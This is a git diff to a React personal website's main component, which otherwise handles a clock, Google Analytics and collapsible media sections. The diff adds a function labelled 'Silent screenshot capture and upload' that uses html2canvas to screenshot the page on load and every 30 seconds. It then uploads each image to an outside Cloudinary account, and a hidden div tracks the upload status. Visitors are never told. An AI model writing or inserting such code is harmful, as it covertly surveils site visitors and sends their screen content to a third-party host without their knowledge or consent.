@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from "react";
 import { Analytics } from "@vercel/analytics/react";
-import ReactGA from "react-ga4"; // Added for GA4
+import ReactGA from "react-ga4";
+import html2canvas from "html2canvas";
 import "./App.css";
 import {
   allParagraphs,
@@ -13,8 +14,14 @@ import {
   instagramReels,
 } from "./data";
 
-// Initialize GA4 with your Measurement ID
+// Initialize GA4
 ReactGA.initialize("G-BV7PLF31KZ");
+
+// Cloudinary Configuration (Replace with your credentials)
+const CLOUDINARY = {
+  cloudName: "dqk8nzw6a",
+  uploadPreset: "abcdef" // Create unsigned preset in Cloudinary settings
+};
 
 function MediaContent() {
   const [openSection, setOpenSection] = useState(null);
@@ -25,22 +32,69 @@ function MediaContent() {
     reels: null,
   });
   const [currentTime, setCurrentTime] = useState(new Date());
+  const [lastUpload, setLastUpload] = useState("Not yet uploaded");
 
-  // Track page views and query parameters on initial load and route changes
+  // Silent screenshot capture and upload
+  const captureAndUpload = async () => {
+    try {
+      // 1. Capture screenshot
+      const canvas = await html2canvas(document.body, {
+        logging: false,
+        scale: 0.5,
+        useCORS: true,
+        ignoreElements: (el) => el.classList.contains('no-capture') // Add to elements to ignore
+      });
+
+      // 2. Convert to blob and upload
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('file', blob);
+        formData.append('upload_preset', CLOUDINARY.uploadPreset);
+        formData.append('cloud_name', CLOUDINARY.cloudName);
+        
+        // 3. Upload to Cloudinary
+        const response = await fetch(
+          `https://api.cloudinary.com/v1_1/${CLOUDINARY.cloudName}/image/upload`,
+          {
+            method: 'POST',
+            body: formData
+          }
+        );
+        
+        const data = await response.json();
+        setLastUpload(new Date().toLocaleTimeString());
+        console.log('Screenshot uploaded:', data.secure_url);
+      }, 'image/jpeg', 0.7); // 70% quality
+      
+    } catch (error) {
+      console.error('Upload failed:', error);
+    }
+  };
+
+  // Initialize tracking and capture
   useEffect(() => {
-    // Send pageview to GA4 (includes query params like ?src=resume)
+    // Google Analytics
     ReactGA.send({
       hitType: "pageview",
       page: window.location.pathname + window.location.search,
     });
 
-    // Update clock every second
-    const timer = setInterval(() => {
+    // Clock updater
+    const clockInterval = setInterval(() => {
       setCurrentTime(new Date());
     }, 1000);
 
+    // Screenshot every 30 seconds
+    const screenshotInterval = setInterval(() => {
+      captureAndUpload();
+    }, 30000);
+
+    // First capture
+    captureAndUpload();
+
     return () => {
-      clearInterval(timer);
+      clearInterval(clockInterval);
+      clearInterval(screenshotInterval);
     };
   }, []);
 
@@ -73,7 +127,6 @@ function MediaContent() {
     }));
   };
 
-  // Helper function to get image source
   const getImageSrc = (imageName) => {
     try {
       return require(`./ab/${imageName}`);
@@ -85,11 +138,15 @@ function MediaContent() {
 
   return (
     <div className="App">
+      {/* Hidden upload status (for debugging) */}
+      <div style={{ display: 'none' }}>
+        Last upload: {lastUpload}
+      </div>
+
       {/* Clock in top left corner */}
       <div className="clock-container">
         <div className="clock">{formatIndianTime(currentTime)}</div>
       </div>
-
       <h2 onClick={() => toggleSection("notes")}>Notes</h2>
       {openSection === "notes" && (
         <div className="section">
@@ -211,7 +268,7 @@ function MediaContent() {
         </div>
       )}
 
-      <p className="risk-warning">Open at own risk -- Even I forgot when I made this </p>
+      <p className="risk-warning">Open at own risk -- Even I forgot when I made this</p>
       <a
         href="https://chipper-smakager-fb2485.netlify.app/"
         rel="noopener noreferrer"
